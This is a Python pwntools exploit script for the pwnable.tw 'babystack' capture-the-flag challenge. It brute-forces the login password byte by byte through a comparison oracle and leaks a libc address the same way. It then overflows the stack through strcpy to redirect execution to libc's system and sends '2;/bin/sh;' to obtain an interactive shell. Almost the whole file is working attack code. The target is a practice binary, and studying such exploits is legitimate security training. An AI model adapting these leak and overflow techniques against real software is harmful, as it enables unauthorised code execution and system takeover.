#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
DUMMY = 0xdeadbeefdeadbeef
SAVED_RBP = DUMMY
PAD = lambda x: b"a" * x
CMD_TRY_LOGIN = b"1" * 16

elf = ELF("./babystack_patched")
ld = ELF("./ld-2.23.so")
libc = ELF("./given/libc_64.so.6")


if args.REMOTE:
    p = remote("chall.pwnable.tw", 10205)
else:
    p = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
    if args.D:
        gdb.attach(p)

def enter_password(password, newline=True):
    # We are allowed to enter 16 bytes for the command,
    # but there are some leaks in cmd_buf[8:16]
    # Therefore, we uses a 8-byte cmd
    if newline:
        password += b"\n"
    p.sendafter(b">> ", CMD_TRY_LOGIN)
    p.sendafter(b"Your passowrd :", password)
    msg = p.recvuntil(b"!")
    return b"Login Success" in msg

def logout():
    p.sendlineafter(b">> ", CMD_TRY_LOGIN)

def magic_copy(payload):
    p.sendlineafter(b">> ", b"3")
    p.sendafter(b"Copy :", payload)

def leak_password():
    PASSWORD_LENGTH = 0x10
    passwd = b""
    for i in range(PASSWORD_LENGTH):
        for b in range(1, 256):
            if b == ord("\n"):
                continue
            curr_passwd = passwd + p8(b)
            if enter_password(curr_passwd):
                passwd = curr_passwd
                break
        if len(passwd) == i:
            log.info("Unfortunate byte included 0x0a or 0x00")
            quit()
        logout()
        log.info("pswd recovered: {}".format(passwd))

    log.info("password: {}".format(passwd))
    return passwd

def leak_libc_base(passwd):
    """
    stack leftover at copy_magic[0x48:0x50] is a libc address
    Notice that
    """
    enter_password(b"a" * 0x48, newline=False)
    enter_password(passwd) # login
    magic_copy(b"b" * 0x3f)
    logout()

    payload = b"a" * 8
    for i in range(6):
        for b in range(1, 256):
            curr_payload = payload + p8(b)
            if enter_password(curr_payload):
                payload = curr_payload
                break
        if len(payload) == 8 + i:
            log.info("Unfortunate byte included 0x0a or 0x00")
            quit()
        logout()

    leak = u64(payload[-6:].ljust(8, b"\x00"))
    log.info("libc_leak: {}".format(hex(leak)))
    return leak

def bufovfl(payload):
    """
    Uses stack leftover & strcpy to overflow
    Though strcpy if from a buffer that read() 0x3f bytes,
    stackleft over let us control 0x7f bytes
    """
    assert(len(payload) <= 0x7f)
    r = enter_password(payload, newline=False)
    r = enter_password(b"")
    magic_copy(payload[:0x3f])
    logout()
    return payload


def exploit():
    passwd = leak_password()

    leak = leak_libc_base(passwd)
    libc.address = leak - 0x7a81b # b *0xff1

    rop_rdi = libc.address + 0x21102
    payload = PAD(0x40)
    payload += passwd + PAD(0x10) + p64(DUMMY)
    payload += p64(libc.symbols["system"])
    payload = payload[:0x7f] # drop the last Null byte
    bufovfl(payload)

    r = enter_password(b"")
    assert(r)
    p.sendlineafter(b">> ", b"2;/bin/sh;")
    p.interactive()

if __name__ == "__main__":
    exploit()
